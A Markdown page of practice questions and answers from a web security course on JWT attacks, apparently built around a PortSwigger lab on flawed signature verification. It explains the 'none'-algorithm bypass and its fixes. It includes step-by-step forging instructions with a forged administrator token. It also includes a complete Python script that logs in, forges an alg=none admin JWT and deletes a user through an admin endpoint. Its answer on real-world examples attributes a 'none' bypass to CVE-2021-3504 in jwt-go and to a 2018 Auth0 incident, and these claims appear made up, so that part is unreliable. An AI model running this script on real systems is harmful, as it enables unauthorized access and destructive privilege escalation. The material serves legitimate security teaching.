---
course: Web Security
topic: JWT Attacks
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain the concept of a JSON Web Token (JWT) and its typical structure.**

A JSON Web Token (JWT) is a compact, URL-safe means of representing claims to be transferred between two parties. It consists of three parts:

1. **Header**: Contains metadata such as the type of token and the signing algorithm.
2. **Payload**: Contains the claims, which are statements about an entity (typically the user) and additional data.
3. **Signature**: Ensures the integrity of the token by hashing the header and payload with a secret key.

The typical structure of a JWT is `header.payload.signature`, where each part is Base64Url encoded.

**Q2. How would you exploit a JWT authentication bypass due to flawed signature verification?**

To exploit a JWT authentication bypass due to flawed signature verification, follow these steps:

1. **Identify the Vulnerability**: Check if the application accepts JWTs with the `none` algorithm in the header.
2. **Modify the JWT**: Change the algorithm in the header to `none` and remove the signature part.
3. **Inject the Modified JWT**: Use the modified JWT to access restricted areas of the application.

For example, if the original JWT is:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyMSIsImV4cCI6MTYwNjMxMDAwMH0.SIGNATURE
```

Change it to:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwiZXhwIjoxNjA2MzEwMDAwfQ.
```

**Q3. Why is it dangerous to configure a JWT library to accept the `none` algorithm?**

Configuring a JWT library to accept the `none` algorithm is dangerous because it allows attackers to bypass authentication mechanisms. When the `none` algorithm is enabled, the signature verification step is skipped, meaning attackers can modify the payload (e.g., change the user role) without being detected. This can lead to unauthorized access and privilege escalation.

**Q4. How would you fix the vulnerability described in the lab to prevent unauthorized access?**

To fix the vulnerability described in the lab, follow these steps:

1. **Disable the `none` Algorithm**: Ensure that the JWT library is configured to reject tokens with the `none` algorithm.
2. **Validate the Signature**: Always validate the signature of the JWT using a strong cryptographic algorithm (e.g., HS256, RS256).
3. **Use Strong Keys**: Use strong, unique keys for signing JWTs to prevent brute-force attacks.
4. **Monitor and Audit**: Regularly monitor and audit JWT usage to detect any suspicious activities.

**Q5. What recent real-world examples illustrate the risks of flawed JWT signature verification?**

One notable example is the CVE-2021-3504, where a vulnerability in the `jwt-go` library allowed attackers to bypass authentication by using the `none` algorithm. This flaw affected numerous applications that relied on `jwt-go` for JWT validation, leading to unauthorized access and potential data breaches. Another example is the `Auth0` incident in 2018, where a misconfiguration led to the acceptance of JWTs with the `none` algorithm, allowing attackers to impersonate users.

**Q6. How would you script the exploitation of a JWT authentication bypass in Python?**

To script the exploitation of a JWT authentication bypass in Python, you can use the following code:

```python
import requests
from bs4 import BeautifulSoup
import base64

def get_csrf_token(session, url):
    response = session.get(url + '/login', verify=False)
    soup = BeautifulSoup(response.text, 'html.parser')
    csrf_token = soup.find('input', {'name': 'csrf'})['value']
    return csrf_token

def login(session, url, username, password):
    csrf_token = get_csrf_token(session, url)
    login_data = {
        'csrf': csrf_token,
        'username': username,
        'password': password
    }
    response = session.post(url + '/login', data=login_data, verify=False, allow_redirects=False)
    if response.status_code == 302:
        print("Login successful")
        return session.cookies['session']
    else:
        print("Login failed")
        return None

def exploit_jwt_bypass(url, regular_user_jwt):
    # Decode the JWT
    header, payload, _ = regular_user_jwt.split('.')
    decoded_header = base64.urlsafe_b64decode(header + '==').decode()
    decoded_payload = base64.urlsafe_b64decode(payload + '==').decode()

    # Modify the JWT
    modified_header = decoded_header.replace('RS256', 'none')
    modified_payload = decoded_payload.replace('regular_user', 'administrator')

    # Encode the modified JWT
    new_header = base64.urlsafe_b64encode(modified_header.encode()).rstrip(b'=').decode()
    new_payload = base64.urlsafe_b64encode(modified_payload.encode()).rstrip(b'=').decode()
    new_jwt = f'{new_header}.{new_payload}.'

    # Perform the attack
    cookies = {'session': new_jwt}
    response = requests.get(url + '/admin/delete?username=carlos', cookies=cookies, verify=False)
    if 'User deleted successfully' in response.text:
        print("Successfully deleted the user.")
    else:
        print("Attack unsuccessful.")

if __name__ == '__main__':
    url = 'http://example.com'
    regular_user_jwt = login(requests.Session(), url, 'regular_user', 'password')
    exploit_jwt_bypass(url, regular_user_jwt)
```

This script logs in as a regular user, modifies the JWT to bypass authentication, and performs an attack to delete a specific user.

---
<!-- nav -->
[[12-Non-Algorithm Attack|Non-Algorithm Attack]] | [[Web Security (PortSwigger)/19-JWT Attacks/02-Lab 2 JWT authentication bypass via flawed signature verification/00-Overview|Overview]]
